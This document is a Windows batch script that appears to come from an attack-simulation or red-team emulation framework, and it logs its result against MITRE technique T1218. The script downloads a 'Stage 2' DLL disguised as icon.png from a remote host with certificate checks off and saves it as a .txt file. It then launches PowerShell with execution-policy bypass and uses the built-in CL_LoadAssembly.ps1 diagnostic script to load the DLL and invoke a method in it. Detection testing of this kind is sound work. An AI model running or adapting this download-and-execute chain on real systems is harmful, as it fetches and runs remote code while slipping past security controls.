@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constant declarations (random-named SET vars) ---
SET pR7bX2kL=%APPDATA%\11990\d88db95c
SET wN4mH9qJ=ba2f2b77.txt
SET fD1tP6yV=https://10.0.0.49/stage/2/icon.png?11990-7
SET cG3eR8uI=ITZEL-S2B
SET sA5zL7oB=11990
SET vQ2wE4rT=7
SET jM6nY8hK=%PUBLIC%\\macula-simulations.log

REM --- Startup: cache timestamp for debug ---
set tsvar=%DATE%/%TIME%

REM --- Debug: script_start ---
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: script_start>> "!jM6nY8hK!" 2>nul

REM --- Step 1: Create output directory if needed ---
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: mkdir_start>> "!jM6nY8hK!" 2>nul
if not exist "!pR7bX2kL!" mkdir "!pR7bX2kL!" >nul 2>&1
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: mkdir_result=!errorlevel!>> "!jM6nY8hK!" 2>nul

REM --- Step 2: Heartbeat fetch (download Stage 2 DLL) ---
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: heartbeat_start>> "!jM6nY8hK!" 2>nul
curl -k -s -o "!pR7bX2kL!\!wN4mH9qJ!" "!fD1tP6yV!"
set heartbeat_exit=%errorlevel%
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: heartbeat_complete>> "!jM6nY8hK!" 2>nul

REM --- Step 3: Change working directory to output directory ---
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: chdir_start>> "!jM6nY8hK!" 2>nul
cd /d "!pR7bX2kL!" >nul 2>&1
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: chdir_result=!errorlevel!>> "!jM6nY8hK!" 2>nul

REM --- Step 4: Invoke Stage 2 DLL via LOLBIN (PowerShell) ---
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: powershell_start>> "!jM6nY8hK!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11990\d88db95c\ba2f2b77.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set powershell_exit=%errorlevel%
echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: powershell_end=!powershell_exit!>> "!jM6nY8hK!" 2>nul

REM --- Step 5: Log TTP result ---
REM Generate timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t

if !powershell_exit! equ 0 (
    set ttp_result=OK
    set ttp_error=
) else (
    set ttp_result=FAIL
    set ttp_error=exitcode=!powershell_exit!
)
echo [!ttp_ts!][TTP][!cG3eR8uI!][!sA5zL7oB!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!jM6nY8hK!" 2>&1

echo [!tsvar!][DEBUG][!cG3eR8uI!][!sA5zL7oB!]: ttp_log>> "!jM6nY8hK!" 2>nul

endlocal